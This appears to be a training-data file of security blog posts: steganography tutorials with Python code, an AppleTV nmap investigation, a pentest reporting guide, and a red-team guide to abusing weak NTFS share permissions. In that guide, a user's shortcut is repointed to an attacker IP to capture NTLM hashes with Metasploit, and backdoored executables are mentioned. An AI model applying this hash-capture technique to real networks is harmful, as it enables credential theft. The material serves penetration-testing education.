00000000 00000000 00010000 00000000  ......\n    00000000 00000000 00000000 00000000 00000000 00000000  ......\n    00000000 00000000 00000000 00000000 00000000 00000000  ......\n    00000000 00000000 00000000 00000000 00000000 00000000  ......\n    11111111 00100110 00000000 00000000 00000000 00000000  .&....\n    00000000 00000000 00000000 00000000 11111111 00000000  ......\n    01111111 01011011 00000000 00000000                    .[..\nBut why are we learning about this? We haven\u2019t even hidden anything yet! Fear not - we shall soon. First, we need to ruin some perfectly good pictures in the process of finding ourselves a place to hide.\nOne of the implications of using numbers for things is that [all bits are equal, but some bits are more equal than others](https://en.wikipedia.org/wiki/Animal_Farm). If you have 5005, and you change the 5 on the left to a 6, that\u2019s a much bigger difference (a difference of a thousand) than if you have 5005 and change the 5 on the right to a 6 (a difference of one). The five on the left in the thousands column would be called the \u201cmost significant digit\u201d while the five on the right in the ones column would be the \u201cleast significant digit,\u201d and picking which five to change matters a **lot**.\n\nLet\u2019s do some quick review: images (at least the ones we\u2019ll be working with here) are made up of pixels arranged in a grid. Each pixel is made up of three values; R, G, and B. By mixing the red, green, and blue values, the pixel can be any color. Just like in \u201cregular\u201d numbers, the binary digits making up the pixels have different significance (matter more) the further to the left they are.\nIn images, the least significant bit in R, G, and B for each pixel does nearly nothing, while the most significant bit can really ruin your day. For instance, this is what happens when you take each of the 8 bits out of a black and white bitmap one layer at a time and make an image out of each layer. Each image represents one \u201csignificance level\u201d of bits; the most significant bit is on the top left, and the least significant on the bottom right.\n\nSee how the most significant bit (top left) makes up most of the image, while the least significant bit (bottom right) is basically just random noise? I bet you could change all of those least significant bits (or maybe even the last two) and nothing would look different in the final image\u2026 perhaps you could change them in some sort of pattern\u2026 like in a message, say. Just a thought.\nHere\u2019s what happens when we take that puppy and flip the least significant bits of every pixel (each of R, G, and B) to all be 1, then the last two bits to both be one, then the last three, and so on:\n\nDid you notice how the first few look totally fine? So it\u2019s concluded: we can definitely flip the first couple of bits in each pixel value of an image, and change them however we want, and nobody will be able to tell.\nWe just found ourselves a place to hide.\n\n______\n \n*Dakota runs Striker Security - you can find more of his writing at https://strikersecurity.com/blog\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"AppleTV & nmap -sV\"\nTaxonomies: \"Author, Brian King, How-To, InfoSec 301, Apple, AppleTV, experiments, Nmap, testing\"\nCreation Date: \"Tue, 11 Oct 2016 14:21:13 +0000\"\nBBKing // \n\nSo I\u2019m working the other day, and my wife asks me why the TV is on. I don\u2019t know. I didn\u2019t turn it on. But it\u2019s near my desk, and I know nobody else turned it on, either. I had been running nmap on my local network to test something out, though. You may have heard that you want to be careful using nmap against printers, because some of them will studiously print out the packets they receive and you may not want to use up all that paper. Was my Apple TV doing something like that?\n\nTurns out it was. Join me for a little investigation-as-excuse-for-practicing-tools. I find chasing my own questions teaches me more about how things work than reading a book or in some other way chasing other people\u2019s questions.\n\nIf you have an AppleTV, do this: Find out its IP address (Settings > General > About > IP Address. Mine was at 192.168.10.110. While you\u2019re here, see if you have model A1625, running tvOS 9.2.2, like I do - maybe it matters?), then shut it off. Then, using a computer on the same network, run an nmap version scan.\n\nnmap -sV 192.168.10.110\n\nWatch the little light on the AppleTV. Mine comes about 30 seconds into the scan. The full scan completes about two or three minutes after that, and declares the following six ports to be open:\n\nVersion Scan Results\n\nI shut it off and ran the scan again, and got the same results, so I\u2019m certain it was the scan that turned it on. Now I want to know what\u2019s making it happen. Maybe there\u2019s something in here I can use to control the AppleTV? Can I turn it off? Start some music? Annoy my neighbor\u2019s AppleTV?\n\nLet\u2019s see what\u2019s happening on the network during this time.\n\nIn one terminal window, I ran tcpdump. In another, I ran the version scan again. Using tcpdump to show traffic as you run a scanner or other automated tool is a good habit. It helps you see that the thing is still running if it\u2019s not producing output. It lets you see if you configured the scanner wrongly and now you\u2019re about to get yourself into trouble scanning the Wrong Things.\n\nIf you run it with no arguments, you get packet headers dumped to stdout. You can add a bpf filter to cut down on uninteresting traffic (e.g. \u2018not arp\u2019) and the -n switch turns off name resolution and the use of well-known port names, so you get shorter lines. If you know the IP addresses you\u2019re looking for, this can be a big help. For things like this, I find the less you let your tools interpret things, the better. I want to see \u201cport 22\u201d not \u201cssh\u201d because what\u2019s there may not actually be ssh all the time.\n\nTcpdump up top, nmap down below\n\nI\u2019m capturing the packets to a file (-w appletv.pcap) for later.\n\nI\u2019m thinking there\u2019s going to be one or two packets that\u2019s causing the thing to turn on, here, but let\u2019s see how many we have to sort through, worst case, before we start looking.\n\n2,869 packets is more than I want to look at.\n\nHow can we narrow this down? That was the whole version scan, and I know the thing I\u2019m interested in is near the start of it.\n\nAlso, I\u2019m going to guess that the packet I want is going to be one sent to an open port, and clearly the nmap scan will be trying to talk to closed ports, too. So, let\u2019s try tcpdump again, but only listening for the ports that we found to be open earlier. That\u2019s 3689, 5000, 7000, 7100, 49152, 62078. And I\u2019m going to stop collecting traffic by hitting Ctrl-c as soon as I see the TV come on.\n\nDown from 2869 to 122 packets.\n\nThat\u2019s a whole lot better. I open the packet capture in Wireshark, and start at the bottom (most recent). I\u2019m looking for anything that looks like a conversation. I notice this one:\n\nConversation of Interest\n\nRight-clicking on that packet, and choosing \u201cFollow.... TCP Stream\u201d shows me this HTTP-ish conversation:\n\nHTTP-ish Conversation\n\nNow, RTSP is not HTTP, but it\u2019s awfully similar in syntax here: I can do this on the command line, if I know what IP and port to send it to. Looking back up at Wireshark, it\u2019s port 5000.\n\nI shut off the AppleTV and try it, piping the OPTIONS request to netcat. The \u201c-e\u201d flag that I set for \u2018echo\u2019 tells it to interpret backslash escape sequences so I get actual newlines instead of a literal backslash-n which would do nobody any good.\n\nSame Response as Captured\n\nI get the same response, but the AppleTV is still off - so this is not the one I want. But it\u2019s interesting that I get such a complete response from a system that is \u201coff.\u201d\n\nHere\u2019s another candidate:\n\nOdd-Looking HTTP Request\n\nThis looks like something nmap is doing to get a specific response out of some specific system. The request is: GET /nice%20ports%2C/Tri%6Eity.txt%2ebak (\u201cnice ports,/Trinity.txt.bak\u201d? - yes, this is nmap creativity at work. Why do they send a request like this? Answer: http://seclists.org/nmap-dev/2006/q2/207)\n\nAnyhow, I sent this one and got no response at all. And no TV wakeup. This is also not the one I want. Going further towards the beginning, I see two bare GET requests, to different ports.\n\nGET / HTTP/1.0 to Port 3689\n\nI can send that:\n\n$ echo -en \"GET / HTTP/1.0\\n\\n\"| nc 192.168.10.110 3689\n\n..and the TV comes on!\n\nThis turned out to be it. Just a \u201cGET /\u201d is all it takes to turn the AppleTV on from the network.\n\nSo, there\u2019s my answer. It was a generic test that\u2019s part of the nmap version scanning logic. Just like the thing where scanning a printer makes it print stuff, this is a side-effect of the scanner, not its intended functionality. And it\u2019s not a bug or a tricky way some obscure packet is handled. It\u2019s the most basic possible HTTP request. Interesting. That seems to suggest some functionality of the AppleTV is probably exposed through this port, and at least some of it doesn\u2019t require authentication.\n\nLooking around the web for information about this port, I came across this \u201cUnofficial AirPlay Protocol Specification\u201d that explains some of what I\u2019m seeing here and gives ideas for further research:https://nto.github.io/AirPlay.html. If you\u2019re interested in how far this goes, that would be my next step.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Take Advantage of Weak NTFS Permissions\"\nTaxonomies: \"Author, David Fletcher, External/Internal, Red Team, NTFS Permissions, pen-testing, Pentesting\"\nCreation Date: \"Thu, 13 Oct 2016 16:35:01 +0000\"\nDavid Fletcher //\n\nWeak NTFS permissions can allow a number of different attacks within a target environment. This can include:\n\nAccess to sensitive information\nModification of system binaries and configuration files\ndll hijacking are things\n\nThese are things a penetration tester might typically consider. However, there are other opportunities that testers should be looking for, especially when we only have limited privileges and want to escalate or expand that access within an environment.\nThe following method is useful in an environment where privilege escalation or lateral movement is limited due to compensating controls. It is recommended that techniques such as password spraying and host assessment with tools like PowerUp be exhausted prior to use of this method.\nWith the limitations understood, what kind of access are we looking for within an environment? In this instance, we\u2019re interested in the ability to write to locations where we might be able to get another user (or scanner) to execute content.\n\nTypically, what we\u2019ll be looking for are shares used for solutions such as roaming profiles, folder redirection, or users\u2019 home directories. In the case of the former, administrators configure these solutions for ease of access, the ability to backup personal user content, and to support remote access and virtualization. Folder redirection can be configured using Group Policy. If you are unfamiliar, additional details can be found at the following URL: https://technet.microsoft.com/en-us/library/cc732275(v=ws.11).aspx\n\nSimilarly, roaming profiles can be set up within the user\u2019s Active Directory account settings. A network share is usually identified where all of the user\u2019s profile information (instead of individual folders) will be stored.\n\nAgain, for those who are unfamiliar, additional details can be found at the following URL: https://technet.microsoft.com/en-us/library/jj649079(v=ws.11).aspx\nOn the same dialog above, we can see the field to specify the user\u2019s home folder. Typically, this is also a shared location. However, the home folder may not contain items that we\u2019ll be targeting in the attack outlined below (shortcuts or internet favorites) but it is still a valuable location if we have write access.\nSo, how do we find these sensitive locations once we\u2019re in an environment? The \u201cProfile Path\u201d and \u201cHome Folder\u201d properties can be interrogated by a standard user using the Get-UserProperties commandlet of PowerView as described in this blog post by HarmJ0y.\nIt is a bit more difficult to identify shared folders used to support folder redirection. In order to locate these folders, the SYSVOL share will have to be searched for the folder redirection policy. That is, unless the user account you\u2019re using has folder redirection applied. In this case, you can inspect the INI files described in this article to determine folder redirection targets.\nOnce the target locations have been identified on the network, the Invoke-ShareFinder commandlet of PowerView or a similar tool can be used to determine where accessible folders exist (with the CheckShareAccess switch). Usage of Invoke-Sharefinder can be found at the following blog posts by HarmJ0y.\nhttp://www.harmj0y.net/blog/powershell/veil-powerview-a-usage-guide/\nhttps://www.veil-framework.com/hunting-sensitive-data-veil-framework/\nNow that we\u2019ve (hopefully) found writable locations, what kind of attacks can we execute? Some obvious ones include modification of commonly accessed files within the \u201cMy Documents\u201d folder. This could include addition of a malicious macro such as a PowerShell Macro from unicorn.py.\n\nInstead, we might backdoor an existing executable using a tool like msfvenom as described below.\nhttps://www.offensive-security.com/metasploit-unleashed/backdooring-exe-files/\nIn both cases, we are hoping that a user executes the content resulting in an additional session and expanded access within the environment.\nInstead of using one of these methods, we are going to explore a different option. This method involves the use of the Metasploit auxiliary/server/capture/smb module. This module is used to collect hashes for cracking via a malicious SMB server. Options for the module can be seen below.\n\nThis Metasploit module would be run on a host that the attacker controls. The IP address and port can be set via the SRVHOST and SRVPORT options respectively. In addition, the module can be configured to log the captured challenge response transaction in either a Cain&Abel or John the Ripper formatted output file for consumption by one of these two tools.\nAfter setting options for the module, the attacker must execute the run command to start the server. The SMB server will then listen in the background and report when an smb hash is received and recorded to one of the specified output files. Execution of the module and display of the running job can be seen below.\n\nFinally, the attacker can modify a shortcut or favorite within the writable directory to cause the user to make a connection and pass hashes to the waiting Metasploit module. As an example, checking the favorites of a user might reveal something like the one seen below.\n\nThe attacker replaces the correct URL (http://www.bing.com) with the attacker\u2019s IP address and appropriate protocol (file://172.16.189.131/). Then, when the target user executes the selected shortcut or favorite, their computer automatically attempts to perform challenge response authentication with the server. Metasploit displays these attempts at the console and logs them to the specified output file. Capture output can be seen below:\n\nThe resulting hashes can then be transferred to a password cracker to recover the user\u2019s credentials.\nIt should be noted that the modified shortcut will no longer work properly. However, this is likely to be ignored by the end user. In addition, the modified file may catch credentials from a scheduled scanner performing an authenticated vulnerability scan. The scanning account is likely to have administrator privileges which could result in quick success if a strong password is not used.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How a No-Name, Nobody-Ever-Heard-Of, Kid* Like Me Got Hired by BHIS from a Craigslist Ad\"\nTaxonomies: \"Author, InfoSec 101, Jordan Drysdale, best place to work on Earth, Craigslist, new jobs, problem solving, text only resume\"\nCreation Date: \"Thu, 20 Oct 2016 17:22:41 +0000\"\nJordan Drysdale // \n\nStep 1: Craigslist\n\nStep 2: Magic Time\n\nStep 3: Profit $$$$$$\n\nI traveled to Scottsdale last year to enjoy some Citrus fruit around my uncle\u2019s pool after deciding that my job was not exactly the best thing for my health. I had been working crazy hours, was bogged down with one disaster after another. Life literally had come crushing down on my soul like a brick on an ant. The smallish town from which BHIS hails is not exactly known to be some kind of employment mecca so generally speaking, people just settle for what\u2019s available. I was considering moving back toward Colorado since so many of my formative years were spent in Fort Collins and Denver. Jobs were plentiful, the outdoors beckoned and I missed my family down there.\n\nIt was time to make a decision when, through one of the world\u2019s single largest jobs marketplaces, I found a post from BHIS. The wifey certainly scoffed at the thought and cautioned against sharing personal information. We discussed it briefly, forgot about it and headed to Scottsdale to spend some time with family. My uncle is a crazy successful entrepreneur there and was, at one point, Scottsdale\u2019s \u201cBusiness-Person of the Year.\u201d This is no small achievement for anyone and his advice was simple; \u201cAsk yourself what you have to lose and what you have to gain.\u201d\n\n[If you haven\u2019t seen this Craigslist post, you should.]\n\nWe had almost forgotten about the job post and I was sure I'd missed the deadline that last night in Scottsdale. I checked it out, drafted a text-only resume and submitted it. I wondered \u201cWhy in the world BHIS would request a text-only resume.\u201d I\u2019ve come to find out, if you know any of these folks and their \u201cWord Web Bugs\u201d or \u201cTrackBack\u201d trickery, you get it. Word docs can contain all sorts of hackery fun. The chances of someone at this company opening a file attachment with a .docx extension are close to \u201chell freezing solid.\u201d Anyway, Rick from BHIS called a couple of days later to discuss some pre-req Linux questions and scheduled a follow up with Mike. Mike called and drilled me, spoke in Spanish and asked me to come in and meet John.\n\nInterviewing with John is like standing in front of a firing squad with itchy trigger fingers. \u201cOh, you wirelessed at your previous gig? So, which came first, WPA1 or WPA2\u2026?\u201d I went ahead and assumed he wouldn\u2019t bother asking if it was obvious and asked him to explain. As those of you who have attended one of John\u2019s classes, engagements or other public speaking series events, you know he is not short on explanations. He also asked, \u201c...based on your networking background, is it possible to connect to port 70000\u2026?\u201d Hmmm, I pondered and as far as I knew it was impossible. John asked me to figure it out, and yes, it is possible.\n\nAnyway, I guess the point here is that you too can find your dream job. This company has challenged me every single day to be the absolute best I can at logic and problem solving. I\u2019ve been challenged to navigate mistakes, work with our employees and customers on a level that I had never experienced before. It definitely wasn\u2019t about what I knew or didn\u2019t know at the time. I was expected to, under pressure, make intelligent and analytical decisions. That led me to figure out the C compiler uses math and simply starts over after the highest port. So, instead of him connecting to port 70000 and typing commands back and forth, the compiler had dumped that connection on to port 4464. Sure, I needed to ask him to fire up tcpdump and the answer was staring at me in trace data, but that\u2019s not the point.\n\nTrust in yourself. This industry needs more analytical problem solvers. Keep looking, we will keep hiring the best and brightest.\n\n______\n\n*Editor's Note: We would describe Jordan as more like a guy, and less like a \"kid\" but either way, we kinda like him.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Steganography: The Art and Science of Hiding Things in Other Things - Part 2\"\nTaxonomies: \"How-To, binary, digital hide-and-seek, hiding, steganography\"\nCreation Date: \"Fri, 21 Oct 2016 16:23:29 +0000\"\nPart 2: Hiding Data in Images\nDakota Nelson* //\n\nIn part 1, we talked about how bits make up images, and what that means for our game of digital hide-and-seek. In this post, we\u2019ll take our new hiding place and put it to work hiding things, as one does.\nNow that we know where to hide, how do we actually take advantage of that knowledge? With programming, of course!\nThe first thing we need is something to hide. I\u2019ll leave the more questionable part of that to you, and just use this snippet of Python instead, which will take some text and turn it into a list of bits:\n    # let's get our message set up\n\n    message = list('this is a message')\n\n    # convert to binary representation\n\n    message = ['{:07b}'.format(ord(x)) for x in message]\n\n    print(\"Message as binary:\")\n\n    print(message)\n\n    # split the binary into bits\n\n    message = [[bit for bit in x] for x in message]\n\n    # flatten it and convert to integers\n\n    message = [int(bit) for sublist in message for bit in sublist]\n\n    print(\"Message as list of bits:\")\n\n    print(message)\nThe final output of this should be a message that looks like this:\n    [1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, \n 1, 1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 0, \n 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, \n 1, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, \n 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1]\nWhich is the phrase \u201cthis is a message\u201d in binary. Woo! We have something to hide!\nNow we have to take this image:\n\nAnd put our message into it, hiding it in the least significant bits of the image.\nWe\u2019ll use this code snippet, which opens up an existing image and adds a message into it, repeating each bit in the message nine times for reasons that will become clear in a moment:\n from PIL import Image, ImageFilter\n\n    import numpy as np\n\n    \n\n    # first, open the original image\n\n    imgpath = 'images/original/image.bmp'\n\n    img = Image.open(imgpath)\n\n    \n\n    # we'll use simple repetition as a very rudimentary error correcting code to try to \n maintain integrity\n\n    # each bit of the message will be repeated 9 times - the three least significant \n bits of the R,G, and B values of one pixel\n\n    imgArray = list(np.asarray(img))\n\n    \n\n    def set_bit(val, bitNo, bit):\n\n        \"\"\" given a value, which bit in the value to set, and the actual bit (0 or 1) \n to set, return the new value with the proper bit flipped \"\"\"\n\n        mask = 1 << bitNo\n\n        val &= ~mask\n\n        if bit:\n\n            val |= mask\n\n        return val\n\n    \n\n    msgIndex = 0\n\n    newImg = []\n\n    # this part of the code sets the least significant 3 bits of the \n\n    # R, G, and B values in each pixel to be one bit from our message\n\n    # this means that each bit from our message is repeated 9\n\n    # times - 3 each in R, G, and B. This is a waste, technically \n\n    # speaking, but it's needed in case we lose some data in transit\n\n    # using the last 3 bits instead of the last 2 means the image looks\n\n    # a little worse, visually, but we can store more data in it - a tradeoff\n\n    # the more significant the bits get, as well, the less likely they are to be\n\n    # changed by compression - we could theoretically hide data in the\n\n    # most significant bits of the message, and they would probably never\n\n    # be changed by compression or etc., but it would look terrible, which\n\n    # defeats the whole purpose\n\n    for row in imgArray:\n\n        newRow = []\n\n        for pixel in row:\n\n            newPixel = []\n\n            for val in pixel:\n\n                # iterate through RGB values, one at a time\n\n                if msgIndex >= len(message):\n\n                    # if we've run out of message to put in the image, just add zeros\n\n                    setTo = 0\n\n                else:\n\n                    # get another bit from the message\n\n                    setTo = message[msgIndex]\n\n                # set the last 3 bits of this R, G, or B pixel to be whatever we decided \n\n                val = set_bit(val, 0, setTo)\n\n                val = set_bit(val, 1, setTo)\n\n                val = set_bit(val, 2, setTo)\n\n                    \n\n                # continue to build up our new image (now with 100% more hidden message!)\n\n                newPixel.append(val) # this adds an R, G, or B value to the pixel\n\n            # start looking at the next bit in the message\n\n            msgIndex += 1\n\n            newRow.append(newPixel) # this adds a pixel to the row\n\n        newImg.append(newRow) # this adds a row to our image array\n\n    \n\n    arr = np.array(newImg, np.uint8) # convert our new image to a numpy array\n\n    im = Image.fromarray(arr)\n im.save(\"image_steg.bmp\")\nYou\u2019re probably wondering\u2026 why are we repeating the message so much? Nine times per bit seems excessive.\nIt turns out that we aren\u2019t the only people who have noticed that the least significant bits in an image are basically random. Someone has beaten us to our own hiding place, and they\u2019re using it for boring stuff.\nThe objective of compression, according to Wikipedia, is \u201cto reduce irrelevance and redundancy of the image data in order to be able to store or transmit data in an efficient form.\u201d\nBut that \u201cirrelevant and redundant data\u201d is where we wanted to put our sneaky message stuff, and compression destroys those bits. Drat. Turns out if there are useless bits, such as the least significant bit of each pixel value, they\u2019re perfect for hiding things in because nobody cares about them, but also the first to get thrown out by compression\u2026 because nobody cares about them.\nSo we fight back, by repeating ourselves a bunch so that even if some bits get flipped by compression, our data still mostly makes it through. It\u2019s not elegant, but it works. (This will be better explained in part 3, where we\u2019ll get into more elegant methods using some cool math.)\nOnce we run the image through our code, it looks like this:\n\nWhich might look familiar - and now we know the message that this puppy is hiding from part 1! But\u2026 how do we get it out once it\u2019s been put in?\nHere\u2019s how:\n   # open the image and extract our least significant bits to see if the message made it through\n\n    \n\n    img = Image.open(path)\n\n    imgArray = list(np.asarray(img))\n\n    \n\n    # note that message must still be set from the code block above\n\n    # (or you can recreate it here)\n\n    origMessage = message[:20] # take the first 20 characters of the original message\n\n    # we don't use the entire message here since we just want to make sure it made it through\n\n    print(\"Original message:\")\n\n    print(origMessage)\n\n    \n\n    message = []\n\n    \n\n    for row in imgArray:\n\n        for pixel in row:\n\n            # we'll take a count of how many \"0\" or \"1\" values we see and then go with\n\n            # the highest-voted result (hopefully we have enough repetition!)\n\n            count = {\"0\": 0, \"1\": 0}\n\n            for val in pixel:\n\n                # iterate through RGB values of the pixel, one at a time\n\n                # convert the R, G, or B value to a byte string\n\n                byte = '{:08b}'.format(val)\n\n                # then, for each of the least significant 3 bits in each value...\n\n                for i in [-1, -2, -3]:\n\n                    # try to get an actual 1 or 0 integer from it\n\n                    try:\n\n                        bit = int(byte[i])\n\n                    except:\n\n                        # if, somehow, the last part of the byte isn't an integer...?\n\n                        # (this should never happen)\n\n                        print(bin(val))\n\n                        raise\n\n    \n\n                    # count up the bits we've seen\n\n                    if bit == 0:\n\n                        count[\"0\"] += 1\n\n                    elif bit == 1:\n\n                        count[\"1\"] += 1\n\n                    else:\n\n                        print(\"WAT\")\n\n                        \n\n            # and once we've seen them all, decide which we should go with\n\n            # hopefully if compression (or anything) flipped some of these bits,\n\n            # it will flip few enough that the majority are still accurate\n\n            if count[\"1\"] > count[\"0\"]:\n\n                message.append(1)\n\n            else:\n\n                message.append(0)\n\n    \n\n    # even though we extracted the full message, we still only display the\n\n    # first 20 characters just to make sure they match what we expect\n\n    print(\"Extracted message:\")            \n\n    print(message[:20])\n Run this on the image, and you get the first 20 characters of the original message and newly-extracted message:\n    Original message:\n\n    [1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0]\n\n    Extracted message:\n\n    [1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0]\nAwesome! They\u2019re the same! We just moved data around hidden in an image using steganography! (Something to try on your own: can you reassemble these bits back into text by reversing the process from earlier?)\nBeing able to extract steganographically encoded data from an image is cool, but having to repeat ourselves so much means that we can\u2019t move very much data, and that it\u2019s fairly obvious - the image with hidden data in it looks different enough from the original that you can tell something is up if you look closely enough. This image is 500 by 500 pixels, which means (since we can only hide one bit of data per pixel) that we can only hide just over 31 kB of data in this image. That\u2019s great, and somewhat useful, but you\u2019re going to need a lot of pictures to send any significant amounts of data - especially since we\u2019re using the least significant 3 bits in the image, and we\u2019d prefer to use less so that the image doesn\u2019t look any different. In part 3, we\u2019ll explore how to use more complicated error correcting codes to make our data hiding more efficient.\nSpecial thanks to Zoher Ghadyali and Philip Seger for collaborating years ago on an original version of the code that these code snippets have been modified from.\n______\n\n*Dakota runs Striker Security - you can find more of his writing at https://strikersecurity.com/blog\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Not Suck at Reporting (or How to Write Great Pentesting Reports)\"\nTaxonomies: \"Author, David Fletcher, Red Team, pentest reporting, pentest reports, Pentesting, red team life, reporting, technical writing, writing\"\nCreation Date: \"Mon, 24 Oct 2016 17:13:37 +0000\"\nDavid Fletcher //\n\nReporting is a penetration testing topic that doesn\u2019t have a whole lot of popularity. People have a hard time being inspired to write about the technical details of their engagements. In some cases, testers skim the surface only identifying the successful portions of their test. In others, testers just regurgitate the output from some scanning tool calling the results the final report.\n\nHowever, sometimes you find a tester who creates a work of art.  It covers successful exploitation, the things that didn\u2019t work, identifies the impact of a vulnerability in a way that the organization can understand, recommends corrective action, and does so in a manner that tells a story such that the organization can recreate the results or retest directly from the report itself. It is this type of report that we strive to create for every engagement here at BHIS.\nThe next few paragraphs will explain what I believe are the most important aspects of good reporting. I\u2019ve put them in order of what I believe to be most critical to providing value to your customer.  So let\u2019s go ahead and get started...\n1.  The Scientific Method\n\nAll of the steps are critical to our success because they feed into the last step - share.\nMost people will be familiar with the steps outlined by the scientific method; question, hypothesize, experiment, observe & record, analyze, and share results. Application of this methodology was beaten into me by engineering school as I was forced to write lab reports in this style at least once every week for four years.  When reporting on a penetration test, we can apply this method to each vulnerability that we find in an environment. Let\u2019s break each step down:\n\nQuestion - Many of our questions are typically asked up front by a vulnerability scanner. However, we should be prepared to ask additional questions once we\u2019ve processed the scanning results. Questions such as \u201cWhat are the not-so-common listening ports on the network?\u201d, \u201cWhere might I be able to use default credentials?\u201d, or \u201cWhat happens when\u2026?\u201d\nHypothesize - Typically, this step involves interpreting scanning results or a response from an application or service that we\u2019re interacting with. This can include selection of a tool or technique that we believe may be successful against a particular service or host.\nExperiment - This is execution of the actual exploit or tool that we\u2019ve identified in the hypothesize step.\nObserve & Record - Here we record the outcome of our exploitative effort.\nAnalyze - Did it work, did it fail, why? What can we learn from it? At this point we may change our hypothesis or identify a different approach or tool for the experiment.\nShare - Here we document the results of the process.\n\nShare is the step that is most emphasized in engineering disciplines.  An experiment means nothing if the results cannot be independently verified.  Repeatability is what we strive for in our testing and a critical element is that our customers can independently validate our results.\n2. Tell a Story\n\nEach vulnerability that you investigate should have a story attached to it. You should attempt to answer the following questions for each vulnerability you investigate.\n\nWhat drew you to this element (vulnerability scanning results, an unidentified listening service, an uncommon open port)?\nWhat was the vulnerability?\nWhat impact does it have on the organization?\nDid you attempt to exploit it?\nHow difficult was it to construct an exploit?\nWhat was the result of the exploit attempt?\nCan further exploitation be attained?\nWhat can the organization do to remediate the issue?\nWhat can the organization do to mitigate the issue?\n\nReporting usually has the competing priorities of full coverage and brevity. However, your report should include details on failed attempts at exploitation as much as successful ones.  This shows the target organization where defenses are working and helps them to understand your approach to executing the test.\n3. Write as You Go\n\nInstead of collecting artifacts and assembling the story once the test is complete, you should try to write the methodology section of your report as you go. This allows you to record your actions, take screen captures, and identify potential findings as a stream of consciousness. This account of your testing activity does not need to be perfect. However, it goes a long way in completing your report as it will only need a small amount of polish and full write-up of any findings identified within it.\n4. Organization\n\nThere are several ways to approach organization within a report and none of them are wrong.  The easiest is likely chronological order. By recording as you test you ensure that all of the pertinent details are captured and that none of your testing needs to be accomplished twice. Since most scanning tools record vulnerabilities by a relative risk rating, it is likely that chronological order will coincide with a risk rating order as well. This ensures that the most important material is at the beginning of your methodology section.\nHowever, it may be wise to add content to sections as they make sense.  Many high risk vulnerabilities will be identified in the \u201cInformational\u201d findings while exploring a vulnerability scan. Moving this information to the beginning of the report may make the most sense.  In addition, grouping similar vulnerabilities together may be appropriate. As an example, misconfigurations in TLS, SSH, and RDP services have a similar impact and so it makes sense to keep them in the same area of the report.\n5. Illustration\nMake sure to include many illustrative screenshots of the condition that you\u2019re investigating, the tools used to exploit it, and the results of exploitation. Within each screenshot you should also zoom in on the point of interest and have indicators highlighting the action. A screenshot doesn\u2019t help if your audience can\u2019t figure out what it is trying to convey. However, a well thought out image of the situation can go a long way in helping to recreate results and driving home the impact of the activity.\nAs you\u2019re putting these illustrations together, be cautious of the information that you are displaying.  In many cases, the elements of a test that drive business impact are sensitive in nature. Some may be obscure like password hashes, but others are more direct, like personally identifiable information or protected health information. As a penetration tester, we never know where our reports might end up, whose hands they will be in, or the motivation of the individual reading. As a result, we absolutely must make sure that graphics are properly redacted.\n6. Voice and Tense\n\nAs much as possible, reports should use past tense. Since a penetration test is a point in time assessment, it is appropriate to identify the vulnerabilities that WERE present in the environment at the time of testing. This helps to remind the reader that changes may have occurred within the environment affecting the vulnerabilities identified within the report. These changes could result in degradation or improvement of the overall posture of the environment.\n\nThird person is an almost universal requirement in official technical and engineering writing. Penetration test reporting is no exception.  As a result, you should avoid using first and second person pronouns such as I, we, and you. Instead, replace them with third person nouns and pronouns such as \u201ctesters\u201d, \u201cthe tester,\u201d he, she, him, her, and it.\n\nActive versus passive voice has a long-standing flame war akin to \u201cvi versus emacs\u201d within the scientific community.  Some argue that active voice is more concise and clear. Others indicate that passive voice helps to avoid first person pronouns and stresses what was accomplished. Just like the question of your favorite editor, this is a personal choice that is up to you. A full treatment on the subject can be found at the following URL.\nhttps://cgi.duke.edu/web/sciwriting/index.php?action=passive_voice\nWhatever your choice, just make sure to use it consistently throughout your writing.\n7. Consistency\n\nMany penetration test reports don\u2019t end up being authored by a single individual. Usually, just like the penetration tests themselves, the report is composed of separate sub-elements authored by several members of the testing team. Because of this, a single editor should review the report in its entirety to ensure that all of the individual sections apply the same tense, voice, and styles in a consistent manner. Otherwise, the report will feel fragmented when a customer reads it. The individual sections don\u2019t have to be perfect mirrors of one another but they should strive to avoid wild contrasts that clash with one another.\n6. Grammar and Spelling\n\nGrammar and spelling may seem to be a bit nit picky. However, we operate in a field that stresses attention to detail. As such, we should demonstrate the same attention to detail in our reporting. Spell checkers are ubiquitous in nearly all applications so misspelled words are rarely forgiven. Some things you should always look carefully for are:\n\nMisused words - A correctly spelled word that has the wrong meaning given the context.\nContractions - Don\u2019t use them unless you have to but if you do, make sure that you\u2019re using the right one - your and you\u2019re are not the same thing.\nAcronyms - Make sure you expand them before first use in a report.\nNumbers - consistently use digits or spell out values based on their size or value.\n\nOne of the techniques that I use a lot is the old read it backwards trick. When you read a sentence you wrote you will tend to apply the meaning you intend and skip words. By reading backward, you avoid applying your own context and focus on the words that are on the page.\n8. Fight for Feedback!!!\n\nAfter you\u2019re done reading your report and are satisfied with the content, give it to someone else on your team. Ensure that it gets reviewed for technical accuracy and for adherence to your reporting standard (voice, tense, person, grammar, and spelling).\nAt BHIS we employ a two-tiered review process that mirrors this recommendation. After a tester is happy with their offering, it is sent for peer review to determine technical accuracy. The report is returned to the original tester for edits. Some are incorporated and others discarded. We leave the decision up to the original author.\nAfter the initial editing round is complete, the tester forwards the report to our very own grammar police. They make sure that a real human being (as opposed to a technophile tester) can read and understand the contents of the report. The original author once again accepts or rejects changes and then delivers to the customer.  This process helps to ensure that our reports are top-notch.\nConclusion\nIt is our responsibility 